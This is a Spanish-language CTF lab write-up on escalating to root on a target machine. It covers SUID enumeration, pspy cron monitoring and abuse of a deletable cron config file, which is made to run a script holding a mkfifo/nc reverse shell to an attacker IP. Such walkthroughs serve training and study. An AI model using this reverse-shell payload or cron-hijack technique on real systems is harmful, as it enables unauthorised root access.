## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
pwd
find / -name user.txt
cd /home/berlin/user.txt
```

Aqui vemos que el user.txt solo se puede ver desde la web.

```bash
uname -a
lsb_release
cat /etc/os-release
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
```

aqui vemos binarios SUID. comprobamos con [gtfobins](https://gtfobins.github.io/) si se pueden burlar.

buscamos por bbsuid, abuild-sudo sudo pero no encontramos nada. Tenemos que mirar de CRON. Lo miramos con pspy.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Podemos ver que hay una tarea ejecutada por root que lanza un `sudo -u nobody /usr/bin/node /home/professor/memcached.js` 

Si vamos al `/home/professor` vemos el fichero `memcached.js` pero no nos deja ver lo que hay dentro. Hay otro fichero `memcached.ini` que contiene
el comando ejecutado durante la tarea cron. 

Aqui el truco es que aun que el fichero no se puedo modificar, como esta en nuestra carpeta HOME, lo podemos borrar.

```bash
rm memcached.ini
vi memcached.ini


[program:memcached]
command = sudo -u root /tmp/pwn.sh
```

aqui creamos el pwn.sh

```bash
cd /tmp
touch pwn.sh
chmod +x pwn.sh
vi pwn.sh

#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 443 >/tmp/f
```

nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Esperamos un poco y ganamos acceso al systema como root y podemos leer la flag.
